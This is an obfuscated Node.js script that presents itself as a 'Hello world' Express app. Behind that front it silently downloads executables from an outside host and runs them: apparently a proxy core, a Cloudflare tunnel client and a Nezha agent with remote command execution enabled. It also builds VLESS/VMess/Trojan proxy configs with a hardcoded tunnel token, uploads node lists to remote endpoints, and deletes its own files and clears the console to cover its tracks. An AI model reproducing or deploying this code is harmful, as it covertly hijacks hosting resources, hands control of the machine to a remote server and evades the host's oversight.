const _0x34baa5=_0x20e6;(function(_0x3f4111,_0x3b47a0){const _0x5c31c4=_0x20e6,_0x1f3aa3=_0x3f4111();while(!![]){try{const _0x314d36=parseInt(_0x5c31c4(0x203))/0x1+parseInt(_0x5c31c4(0x198))/0x2+parseInt(_0x5c31c4(0x230))/0x3+parseInt(_0x5c31c4(0x1f5))/0x4*(-parseInt(_0x5c31c4(0x1c0))/0x5)+parseInt(_0x5c31c4(0x183))/0x6*(parseInt(_0x5c31c4(0x1ce))/0x7)+-parseInt(_0x5c31c4(0x194))/0x8+-parseInt(_0x5c31c4(0x20e))/0x9*(-parseInt(_0x5c31c4(0x215))/0xa);if(_0x314d36===_0x3b47a0)break;else _0x1f3aa3['push'](_0x1f3aa3['shift']());}catch(_0x2a6c5a){_0x1f3aa3['push'](_0x1f3aa3['shift']());}}}(_0x2cbe,0x59a92));const express=require(_0x34baa5(0x186)),app=express(),axios=require(_0x34baa5(0x1f6)),os=require('os'),fs=require('fs'),path=require(_0x34baa5(0x21b)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x34baa5(0x193)]),{execSync}=require(_0x34baa5(0x1f9)),UPLOAD_URL=process[_0x34baa5(0x1c4)][_0x34baa5(0x19b)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x34baa5(0x1c4)][_0x34baa5(0x1ca)]||![],FILE_PATH=process[_0x34baa5(0x1c4)]['FILE_PATH']||'./tmp',SUB_PATH=process['env'][_0x34baa5(0x1c5)]||_0x34baa5(0x18b),PORT=process[_0x34baa5(0x1c4)][_0x34baa5(0x1e2)]||process[_0x34baa5(0x1c4)][_0x34baa5(0x223)]||0xbb8,UUID=process[_0x34baa5(0x1c4)][_0x34baa5(0x197)]||'bc97f674-c578-4940-9234-0a1da46041b9',NEZHA_SERVER=process[_0x34baa5(0x1c4)][_0x34baa5(0x1ac)]||'',NEZHA_PORT=process['env'][_0x34baa5(0x202)]||'',NEZHA_KEY=process[_0x34baa5(0x1c4)][_0x34baa5(0x1f0)]||'',ARGO_DOMAIN=process['env'][_0x34baa5(0x1c9)]||_0x34baa5(0x1b1),ARGO_AUTH=process[_0x34baa5(0x1c4)]['ARGO_AUTH']||_0x34baa5(0x1ae),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x34baa5(0x19c)]||_0x34baa5(0x1e5),CFPORT=process[_0x34baa5(0x1c4)][_0x34baa5(0x18e)]||0x1bb,NAME=process['env']['NAME']||'';!fs[_0x34baa5(0x21c)](FILE_PATH)?(fs[_0x34baa5(0x18a)](FILE_PATH),console[_0x34baa5(0x226)](FILE_PATH+_0x34baa5(0x192))):console[_0x34baa5(0x226)](FILE_PATH+_0x34baa5(0x216));function generateRandomName(){const _0x1cbbf8=_0x34baa5,_0x365ef4=_0x1cbbf8(0x1fb);let _0x7b8ed8='';for(let _0x43e4d5=0x0;_0x43e4d5<0x6;_0x43e4d5++){_0x7b8ed8+=_0x365ef4['charAt'](Math[_0x1cbbf8(0x188)](Math['random']()*_0x365ef4['length']));}return _0x7b8ed8;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x34baa5(0x179)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x34baa5(0x179)](FILE_PATH,_0x34baa5(0x20c)),listPath=path[_0x34baa5(0x179)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x34baa5(0x228)),configPath=path[_0x34baa5(0x179)](FILE_PATH,_0x34baa5(0x1ad));function deleteNodes(){const _0x518b80=_0x34baa5;try{if(!UPLOAD_URL)return;if(!fs[_0x518b80(0x21c)](subPath))return;let _0x48429a;try{_0x48429a=fs[_0x518b80(0x1d1)](subPath,_0x518b80(0x204));}catch{return null;}const _0x377a11=Buffer[_0x518b80(0x1fc)](_0x48429a,_0x518b80(0x1b2))['toString'](_0x518b80(0x204)),_0x1c0410=_0x377a11[_0x518b80(0x22a)]('\x0a')['filter'](_0xa01523=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x518b80(0x1a2)](_0xa01523));if(_0x1c0410[_0x518b80(0x1fe)]===0x0)return;return axios[_0x518b80(0x225)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x518b80(0x222)]({'nodes':_0x1c0410}),{'headers':{'Content-Type':_0x518b80(0x1bb)}})[_0x518b80(0x1b7)](_0x515679=>{return null;}),null;}catch(_0x5b6f21){return null;}}function cleanupOldFiles(){const _0x3adf6c=_0x34baa5;try{const _0x416eb6=fs[_0x3adf6c(0x1a8)](FILE_PATH);_0x416eb6[_0x3adf6c(0x206)](_0x49a5a9=>{const _0x404e08=_0x3adf6c,_0x5d6385=path[_0x404e08(0x179)](FILE_PATH,_0x49a5a9);try{const _0x2be2c3=fs['statSync'](_0x5d6385);_0x2be2c3['isFile']()&&fs[_0x404e08(0x1dc)](_0x5d6385);}catch(_0x4f6e34){}});}catch(_0x5f8c67){}}app['get']('/',function(_0x4bd99d,_0x5a1ec0){const _0x50239c=_0x34baa5;_0x5a1ec0[_0x50239c(0x1de)]('Hello\x20world!');});async function generateConfig(){const _0x534acc=_0x34baa5,_0x27626e={'log':{'access':_0x534acc(0x178),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x534acc(0x17a)}],'decryption':_0x534acc(0x1b8),'fallbacks':[{'dest':0xbb9},{'path':_0x534acc(0x21f),'dest':0xbba},{'path':_0x534acc(0x1ef),'dest':0xbbb},{'path':_0x534acc(0x22c),'dest':0xbbc}]},'streamSettings':{'network':_0x534acc(0x1dd)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x534acc(0x1b8)},'streamSettings':{'network':_0x534acc(0x1dd),'security':_0x534acc(0x1b8)}},{'port':0xbba,'listen':_0x534acc(0x207),'protocol':_0x534acc(0x187),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x534acc(0x1b8),'wsSettings':{'path':_0x534acc(0x21f)}},'sniffing':{'enabled':!![],'destOverride':[_0x534acc(0x17e),'tls',_0x534acc(0x1a7)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x534acc(0x207),'protocol':_0x534acc(0x21a),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x534acc(0x1ef)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x534acc(0x18d),_0x534acc(0x1a7)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x534acc(0x207),'protocol':_0x534acc(0x20f),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x534acc(0x22c)}},'sniffing':{'enabled':!![],'destOverride':[_0x534acc(0x17e),_0x534acc(0x18d),_0x534acc(0x1a7)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x534acc(0x1e3)},{'protocol':_0x534acc(0x191),'tag':_0x534acc(0x182)}]};fs[_0x534acc(0x190)](path[_0x534acc(0x179)](FILE_PATH,_0x534acc(0x1ad)),JSON[_0x534acc(0x222)](_0x27626e,null,0x2));}function getSystemArchitecture(){const _0x451a23=_0x34baa5,_0x303f93=os['arch']();return _0x303f93===_0x451a23(0x1b3)||_0x303f93===_0x451a23(0x184)||_0x303f93===_0x451a23(0x1ea)?_0x451a23(0x1b3):_0x451a23(0x1ed);}function _0x20e6(_0xf9b425,_0xa8a23c){_0xf9b425=_0xf9b425-0x178;const _0x2cbe12=_0x2cbe();let _0x20e627=_0x2cbe12[_0xf9b425];return _0x20e627;}function downloadFile(_0x583267,_0x36f620,_0x494645){const _0x9e7c59=_0x34baa5,_0x1718ef=_0x583267;!fs[_0x9e7c59(0x21c)](FILE_PATH)&&fs[_0x9e7c59(0x18a)](FILE_PATH,{'recursive':!![]});const _0x293923=fs[_0x9e7c59(0x189)](_0x1718ef);axios({'method':_0x9e7c59(0x214),'url':_0x36f620,'responseType':'stream'})[_0x9e7c59(0x1cf)](_0x374fd2=>{const _0x17292b=_0x9e7c59;_0x374fd2[_0x17292b(0x1a5)][_0x17292b(0x199)](_0x293923),_0x293923['on'](_0x17292b(0x1d8),()=>{const _0x3b37c2=_0x17292b;_0x293923[_0x3b37c2(0x1bc)](),console[_0x3b37c2(0x226)]('Download\x20'+path[_0x3b37c2(0x17d)](_0x1718ef)+'\x20successfully'),_0x494645(null,_0x1718ef);}),_0x293923['on'](_0x17292b(0x217),_0x96c027=>{const _0x54435f=_0x17292b;fs[_0x54435f(0x1d5)](_0x1718ef,()=>{});const _0x30e338=_0x54435f(0x219)+path['basename'](_0x1718ef)+_0x54435f(0x18c)+_0x96c027['message'];console[_0x54435f(0x217)](_0x30e338),_0x494645(_0x30e338);});})[_0x9e7c59(0x1b7)](_0x4f17b7=>{const _0x53a43a=_0x9e7c59,_0x2a12d3=_0x53a43a(0x219)+path[_0x53a43a(0x17d)](_0x1718ef)+_0x53a43a(0x18c)+_0x4f17b7['message'];console[_0x53a43a(0x217)](_0x2a12d3),_0x494645(_0x2a12d3);});}async function downloadFilesAndRun(){const _0x71dc41=_0x34baa5,_0x51a651=getSystemArchitecture(),_0x70843d=getFilesForArchitecture(_0x51a651);if(_0x70843d[_0x71dc41(0x1fe)]===0x0){console[_0x71dc41(0x226)](_0x71dc41(0x1d7));return;}const _0x195941=_0x70843d['map'](_0x1520ef=>{return new Promise((_0x4bd43c,_0x345972)=>{const _0x4774a7=_0x20e6;downloadFile(_0x1520ef[_0x4774a7(0x1a3)],_0x1520ef[_0x4774a7(0x1ec)],(_0x33b193,_0xe59871)=>{_0x33b193?_0x345972(_0x33b193):_0x4bd43c(_0xe59871);});});});try{await Promise['all'](_0x195941);}catch(_0x1ac348){console[_0x71dc41(0x217)](_0x71dc41(0x1f8),_0x1ac348);return;}function _0x9f7689(_0x229765){const _0x5e5804=_0x71dc41,_0x335144=0x1fd;_0x229765[_0x5e5804(0x206)](_0x1a0c49=>{const _0x12d726=_0x5e5804;fs[_0x12d726(0x21c)](_0x1a0c49)&&fs[_0x12d726(0x1d0)](_0x1a0c49,_0x335144,_0x454388=>{const _0x4274ad=_0x12d726;_0x454388?console[_0x4274ad(0x217)](_0x4274ad(0x1b6)+_0x1a0c49+':\x20'+_0x454388):console['log'](_0x4274ad(0x1d9)+_0x1a0c49+':\x20'+_0x335144[_0x4274ad(0x1e1)](0x8));});});}const _0x5b5b8e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x9f7689(_0x5b5b8e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x421538=NEZHA_SERVER[_0x71dc41(0x1c2)](':')?NEZHA_SERVER['split'](':')[_0x71dc41(0x1c3)]():'',_0x4195eb=new Set([_0x71dc41(0x185),_0x71dc41(0x1a6),_0x71dc41(0x1d2),'2087',_0x71dc41(0x201),_0x71dc41(0x22d)]),_0x5d06c8=_0x4195eb[_0x71dc41(0x20d)](_0x421538)?_0x71dc41(0x1a1):_0x71dc41(0x231),_0x341c14=_0x71dc41(0x1e8)+NEZHA_KEY+_0x71dc41(0x19a)+NEZHA_SERVER+_0x71dc41(0x1cc)+_0x5d06c8+_0x71dc41(0x212)+UUID;fs['writeFileSync'](path[_0x71dc41(0x179)](FILE_PATH,_0x71dc41(0x195)),_0x341c14);const _0x122b1a=_0x71dc41(0x22f)+phpPath+_0x71dc41(0x1c7)+FILE_PATH+_0x71dc41(0x220);try{await exec(_0x122b1a),console['log'](phpName+_0x71dc41(0x17b)),await new Promise(_0x352a55=>setTimeout(_0x352a55,0x3e8));}catch(_0x5cd387){console[_0x71dc41(0x217)](_0x71dc41(0x1f7)+_0x5cd387);}}else{let _0x438b9b='';const _0x171841=['443',_0x71dc41(0x1a6),_0x71dc41(0x1d2),_0x71dc41(0x221),_0x71dc41(0x201),'2053'];_0x171841[_0x71dc41(0x1c2)](NEZHA_PORT)&&(_0x438b9b=_0x71dc41(0x1e7));const _0x286ab7=_0x71dc41(0x22f)+npmPath+_0x71dc41(0x224)+NEZHA_SERVER+':'+NEZHA_PORT+_0x71dc41(0x1e6)+NEZHA_KEY+'\x20'+_0x438b9b+_0x71dc41(0x22e);try{await exec(_0x286ab7),console[_0x71dc41(0x226)](npmName+_0x71dc41(0x17b)),await new Promise(_0x350b59=>setTimeout(_0x350b59,0x3e8));}catch(_0x9f97a7){console[_0x71dc41(0x217)](_0x71dc41(0x1a0)+_0x9f97a7);}}}else console['log'](_0x71dc41(0x1ba));const _0x25c137=_0x71dc41(0x22f)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x25c137),console[_0x71dc41(0x226)](webName+_0x71dc41(0x17b)),await new Promise(_0x5e639f=>setTimeout(_0x5e639f,0x3e8));}catch(_0x154e5d){console[_0x71dc41(0x217)](_0x71dc41(0x1db)+_0x154e5d);}if(fs[_0x71dc41(0x21c)](botPath)){let _0x5096b3;if(ARGO_AUTH[_0x71dc41(0x1aa)](/^[A-Z0-9a-z=]{120,250}$/))_0x5096b3=_0x71dc41(0x211)+ARGO_AUTH;else ARGO_AUTH[_0x71dc41(0x1aa)](/TunnelSecret/)?_0x5096b3='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x5096b3=_0x71dc41(0x1fd)+FILE_PATH+_0x71dc41(0x1ee)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5096b3+_0x71dc41(0x227)),console['log'](botName+_0x71dc41(0x17b)),await new Promise(_0x25453d=>setTimeout(_0x25453d,0x7d0));}catch(_0x4b20a5){console[_0x71dc41(0x217)](_0x71dc41(0x1e4)+_0x4b20a5);}}await new Promise(_0x20bd83=>setTimeout(_0x20bd83,0x1388));}function getFilesForArchitecture(_0x208860){const _0x1fa8d5=_0x34baa5;let _0xe77842;_0x208860===_0x1fa8d5(0x1b3)?_0xe77842=[{'fileName':webPath,'fileUrl':_0x1fa8d5(0x1be)},{'fileName':botPath,'fileUrl':_0x1fa8d5(0x1a9)}]:_0xe77842=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1fa8d5(0x1e9)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x20b733=_0x208860==='arm'?_0x1fa8d5(0x1f3):_0x1fa8d5(0x208);_0xe77842['unshift']({'fileName':npmPath,'fileUrl':_0x20b733});}else{const _0x26b399=_0x208860===_0x1fa8d5(0x1b3)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0xe77842[_0x1fa8d5(0x1bf)]({'fileName':phpPath,'fileUrl':_0x26b399});}}return _0xe77842;}function argoType(){const _0x52998a=_0x34baa5;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x52998a(0x226)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x52998a(0x1c2)]('TunnelSecret')){fs[_0x52998a(0x190)](path[_0x52998a(0x179)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x37a5b8=_0x52998a(0x181)+ARGO_AUTH[_0x52998a(0x22a)]('\x22')[0xb]+_0x52998a(0x209)+path[_0x52998a(0x179)](FILE_PATH,_0x52998a(0x1da))+_0x52998a(0x1af)+ARGO_DOMAIN+_0x52998a(0x21e)+ARGO_PORT+_0x52998a(0x1bd);fs[_0x52998a(0x190)](path[_0x52998a(0x179)](FILE_PATH,_0x52998a(0x218)),_0x37a5b8);}else console[_0x52998a(0x226)](_0x52998a(0x229));}function _0x2cbe(){const _0xf2134b=['rm\x20-rf\x20','sub.txt','has','54hRedou','trojan','clear','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','.exe\x20>\x20nul\x202>&1','get','606170sofbYq','\x20already\x20exists','error','tunnel.yml','Download\x20','vmess','path','existsSync','pkill\x20-f\x20\x22[','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','/vless-argo','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','2087','stringify','PORT','\x20-s\x20','post','log','\x20>/dev/null\x202>&1\x20&','boot.log','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','split','&fp=firefox&type=ws&host=','/trojan-argo','2053','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','nohup\x20','2673rsteVc','false','/dev/null','join','xtls-rprx-vision','\x20is\x20running','Add\x20automatic\x20access\x20task\x20faild:\x20','basename','http','response','status','\x0a\x20\x20tunnel:\x20','block','30SXFeHN','arm64','443','express','vless','floor','createWriteStream','mkdirSync','subabc','\x20failed:\x20','tls','CFPORT','&path=%2Fvless-argo%3Fed%3D2560#','writeFileSync','blackhole','\x20is\x20created','exec','4328192vgjQaR','config.yaml','Subscription\x20uploaded\x20successfully','UUID','109690ykjncc','pipe','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','UPLOAD_URL','CFIP','\x20>\x20nul\x202>&1','Error\x20in\x20startserver:','Unhandled\x20error\x20in\x20startserver:','npm\x20running\x20error:\x20','true','test','fileName','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','data','8443','quic','readdirSync','https://arm64.ssss.nyc.mn/bot','match','taskkill\x20/f\x20/im\x20','NEZHA_SERVER','config.json','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiM2FhNGE0YWMtMzM2My00MjkwLWI1MzgtYjAzZGNiMmNiMDIxIiwicyI6Ik9UY3lNV1F5TkRNdE1qWmhOaTAwTnprd0xUZ3dZMk10WkdNM1lXTXpNVE00TlRnMyJ9','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','charAt','clawrunjp.yueji-rights.com','base64','arm','ArgoDomain:','listen','Empowerment\x20failed\x20for\x20','catch','none','http\x20server\x20is\x20running\x20on\x20port:','NEZHA\x20variable\x20is\x20empty,skip\x20running','application/json','close','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://arm64.ssss.nyc.mn/web','unshift','3290msHshe','ARGO_DOMAIN:','includes','pop','env','SUB_PATH','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x20-c\x20\x22','/api/add-nodes','ARGO_DOMAIN','AUTO_ACCESS','Error\x20reading\x20boot.log:','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','trim','232477UFkmGl','then','chmod','readFileSync','2096','&path=%2Ftrojan-argo%3Fed%3D2560#','del\x20/f\x20/q\x20','unlink','\x0a\x20\x20\x20\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','finish','Empowerment\x20success\x20for\x20','tunnel.json','web\x20running\x20error:\x20','unlinkSync','tcp','send','Skipping\x20adding\x20automatic\x20access\x20task','push','toString','SERVER_PORT','direct','Error\x20executing\x20command:\x20','saas.sin.fan','\x20-p\x20','--tls','\x0aclient_secret:\x20','https://amd64.ssss.nyc.mn/bot','aarch64','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','fileUrl','amd','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/vmess-argo','NEZHA_KEY','text/plain;\x20charset=utf-8','automatic\x20access\x20task\x20added\x20successfully','https://arm64.ssss.nyc.mn/agent','\x20>/dev/null\x202>&1','1572gwFkDn','axios','php\x20running\x20error:\x20','Error\x20downloading\x20files:','child_process','\x0a\x20\x20\x0avmess://','abcdefghijklmnopqrstuvwxyz','from','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','length','App\x20is\x20running','/sub.txt\x20saved\x20successfully','2083','NEZHA_PORT','581375YpDitV','utf-8','?security=tls&sni=','forEach','127.0.0.1','https://amd64.ssss.nyc.mn/agent','\x0a\x20\x20credentials-file:\x20','firefox'];_0x2cbe=function(){return _0xf2134b;};return _0x2cbe();}argoType();async function extractDomains(){const _0x182264=_0x34baa5;let _0x545f59;if(ARGO_AUTH&&ARGO_DOMAIN)_0x545f59=ARGO_DOMAIN,console['log'](_0x182264(0x1c1),_0x545f59),await _0x2271b9(_0x545f59);else try{const _0x2e0f16=fs[_0x182264(0x1d1)](path[_0x182264(0x179)](FILE_PATH,'boot.log'),'utf-8'),_0x5d94b6=_0x2e0f16[_0x182264(0x22a)]('\x0a'),_0x53ae96=[];_0x5d94b6[_0x182264(0x206)](_0x166781=>{const _0x3b6562=_0x182264,_0x1f3472=_0x166781[_0x3b6562(0x1aa)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1f3472){const _0x2ceb49=_0x1f3472[0x1];_0x53ae96[_0x3b6562(0x1e0)](_0x2ceb49);}});if(_0x53ae96['length']>0x0)_0x545f59=_0x53ae96[0x0],console[_0x182264(0x226)](_0x182264(0x1b4),_0x545f59),await _0x2271b9(_0x545f59);else{console[_0x182264(0x226)](_0x182264(0x1a4)),fs[_0x182264(0x1dc)](path[_0x182264(0x179)](FILE_PATH,_0x182264(0x228)));async function _0x3641c4(){const _0x3408a5=_0x182264;try{process['platform']==='win32'?await exec(_0x3408a5(0x1ab)+botName+_0x3408a5(0x213)):await exec(_0x3408a5(0x21d)+botName[_0x3408a5(0x1b0)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x51d444){}}_0x3641c4(),await new Promise(_0x47c857=>setTimeout(_0x47c857,0xbb8));const _0x43f54c=_0x182264(0x1fd)+FILE_PATH+_0x182264(0x1ee)+ARGO_PORT;try{await exec(_0x182264(0x22f)+botPath+'\x20'+_0x43f54c+_0x182264(0x227)),console[_0x182264(0x226)](botName+_0x182264(0x17b)),await new Promise(_0x47206b=>setTimeout(_0x47206b,0xbb8)),await extractDomains();}catch(_0x158f2a){console[_0x182264(0x217)](_0x182264(0x1e4)+_0x158f2a);}}}catch(_0x29368f){console['error'](_0x182264(0x1cb),_0x29368f);}async function _0x2271b9(_0xf69e14){const _0x16c148=_0x182264,_0xe17d76=execSync(_0x16c148(0x1c6),{'encoding':_0x16c148(0x204)}),_0x239713=_0xe17d76[_0x16c148(0x1cd)](),_0x21c5e6=NAME?NAME+'-'+_0x239713:_0x239713;return new Promise(_0xb1046f=>{setTimeout(()=>{const _0x28bedc=_0x20e6,_0x303a6b={'v':'2','ps':''+_0x21c5e6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x28bedc(0x1b8),'net':'ws','type':_0x28bedc(0x1b8),'host':_0xf69e14,'path':'/vmess-argo?ed=2560','tls':_0x28bedc(0x18d),'sni':_0xf69e14,'alpn':'','fp':_0x28bedc(0x20a)},_0x4ef7d3='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0xf69e14+_0x28bedc(0x22b)+_0xf69e14+_0x28bedc(0x18f)+_0x21c5e6+_0x28bedc(0x1fa)+Buffer[_0x28bedc(0x1fc)](JSON[_0x28bedc(0x222)](_0x303a6b))[_0x28bedc(0x1e1)](_0x28bedc(0x1b2))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x28bedc(0x205)+_0xf69e14+_0x28bedc(0x22b)+_0xf69e14+_0x28bedc(0x1d3)+_0x21c5e6+_0x28bedc(0x1d6);console[_0x28bedc(0x226)](Buffer['from'](_0x4ef7d3)['toString'](_0x28bedc(0x1b2))),fs['writeFileSync'](subPath,Buffer['from'](_0x4ef7d3)[_0x28bedc(0x1e1)]('base64')),console[_0x28bedc(0x226)](FILE_PATH+_0x28bedc(0x200)),uploadNodes(),app[_0x28bedc(0x214)]('/'+SUB_PATH,(_0x8e562e,_0x4ab2c3)=>{const _0x137d7a=_0x28bedc,_0x2aa151=Buffer[_0x137d7a(0x1fc)](_0x4ef7d3)[_0x137d7a(0x1e1)]('base64');_0x4ab2c3['set']('Content-Type',_0x137d7a(0x1f1)),_0x4ab2c3[_0x137d7a(0x1de)](_0x2aa151);}),_0xb1046f(_0x4ef7d3);},0x7d0);});}}async function uploadNodes(){const _0x58460e=_0x34baa5;if(UPLOAD_URL&&PROJECT_URL){const _0x45fc10=PROJECT_URL+'/'+SUB_PATH,_0x5b6a57={'subscription':[_0x45fc10]};try{const _0x520f24=await axios[_0x58460e(0x225)](UPLOAD_URL+'/api/add-subscriptions',_0x5b6a57,{'headers':{'Content-Type':_0x58460e(0x1bb)}});return _0x520f24&&_0x520f24[_0x58460e(0x180)]===0xc8?(console[_0x58460e(0x226)](_0x58460e(0x196)),_0x520f24):null;}catch(_0x27bbc6){if(_0x27bbc6['response']){if(_0x27bbc6[_0x58460e(0x17f)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x2077c2=fs[_0x58460e(0x1d1)](listPath,_0x58460e(0x204)),_0x5f48bf=_0x2077c2[_0x58460e(0x22a)]('\x0a')['filter'](_0x322ebb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x58460e(0x1a2)](_0x322ebb));if(_0x5f48bf['length']===0x0)return;const _0x138a44=JSON[_0x58460e(0x222)]({'nodes':_0x5f48bf});try{const _0x5b29f0=await axios[_0x58460e(0x225)](UPLOAD_URL+_0x58460e(0x1c8),_0x138a44,{'headers':{'Content-Type':_0x58460e(0x1bb)}});return _0x5b29f0&&_0x5b29f0[_0x58460e(0x180)]===0xc8?(console[_0x58460e(0x226)]('Nodes\x20uploaded\x20successfully'),_0x5b29f0):null;}catch(_0x45cf07){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x16e41c=_0x20e6,_0x3bca1f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3bca1f[_0x16e41c(0x1e0)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3bca1f[_0x16e41c(0x1e0)](phpPath);process['platform']==='win32'?exec(_0x16e41c(0x1d4)+_0x3bca1f[_0x16e41c(0x179)]('\x20')+_0x16e41c(0x19d),_0xa8a266=>{const _0x1e7c90=_0x16e41c;console[_0x1e7c90(0x210)](),console[_0x1e7c90(0x226)](_0x1e7c90(0x1ff)),console[_0x1e7c90(0x226)](_0x1e7c90(0x1eb));}):exec(_0x16e41c(0x20b)+_0x3bca1f[_0x16e41c(0x179)]('\x20')+_0x16e41c(0x1f4),_0x2707c7=>{const _0x4aa063=_0x16e41c;console['clear'](),console[_0x4aa063(0x226)](_0x4aa063(0x1ff)),console[_0x4aa063(0x226)](_0x4aa063(0x1eb));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x32d11d=_0x34baa5;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x32d11d(0x226)](_0x32d11d(0x1df));return;}try{const _0x481fa3=await axios[_0x32d11d(0x225)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x32d11d(0x226)](_0x32d11d(0x1f2)),_0x481fa3;}catch(_0x30d8fd){return console['error'](_0x32d11d(0x17c)+_0x30d8fd['message']),null;}}async function startserver(){const _0x508409=_0x34baa5;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2c8d58){console[_0x508409(0x217)](_0x508409(0x19e),_0x2c8d58);}}startserver()[_0x34baa5(0x1b7)](_0x4374a5=>{const _0x5d0ab6=_0x34baa5;console[_0x5d0ab6(0x217)](_0x5d0ab6(0x19f),_0x4374a5);}),app[_0x34baa5(0x1b5)](PORT,()=>console['log'](_0x34baa5(0x1b9)+PORT+'!'));
